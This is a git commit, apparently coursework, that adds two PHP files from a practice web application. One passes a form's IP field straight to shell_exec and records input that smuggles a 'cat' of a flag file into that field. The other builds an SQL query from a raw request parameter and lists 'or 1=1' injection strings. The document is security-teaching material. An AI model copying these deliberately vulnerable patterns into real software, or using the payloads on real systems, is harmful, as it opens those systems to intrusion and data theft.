053690264a148debc052f59c2662126dc887dca8
Mark Thompson <mthompson.dev@gmail.com>
2017-11-12 13:29:14 -0600

    Update

---
+++ Assignment6/Command_Injection.php
@@ -0,0 +1,28 @@
+// Command injection
+
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "<pre>{$cmd}</pre>";
+}
+
+?> 
+
+Form data	
+ip	192.168.56.102; cat hackable/uploads/flag.txt
+Submit	Submit
+user_token	7eea42d9c24269a8f6dda269700f45b4
---
+++ Assignment6/SQL_injection.php
@@ -0,0 +1,46 @@
+-- sql injection
+
+<?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_REQUEST[ 'id' ];
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or 
+			  die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? 
+			  mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+    }
+
+    mysqli_close($GLOBALS["___mysqli_ston"]);
+}
+
+?> 
+
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+
+SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1;
+
+
+1' or '1'='1';--
+
+
+create table users
+( id char(1), first_name char(10), last_name char(10) )
+
+
+insert into users(id,first_name,last_name) values ('1','1FN','1LN')
+insert into users(id,first_name,last_name) values ('2','2FN','2LN')
+insert into users(id,first_name,last_name) values ('3','3FN','3LN')
+insert into users(id,first_name,last_name) values ('4','4FN','4LN')
+insert into users(id,first_name,last_name) values ('5','5FN','5LN')
